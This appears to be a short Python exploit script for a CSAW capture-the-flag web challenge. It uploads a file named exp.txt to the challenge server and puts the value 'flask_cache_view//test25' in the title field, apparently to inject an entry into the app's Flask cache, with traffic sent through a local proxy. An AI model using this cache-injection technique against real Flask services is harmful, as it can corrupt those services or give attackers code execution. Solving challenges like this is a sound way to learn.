import requests

r = requests.post("http://web.chal.csaw.io:5000/",
                  files={
                      "content": open('exp.txt').read(),
                      "title": ("", "flask_cache_view//test25")
                  },
                  proxies={'http': 'http://localhost:8080'})
print(r.text)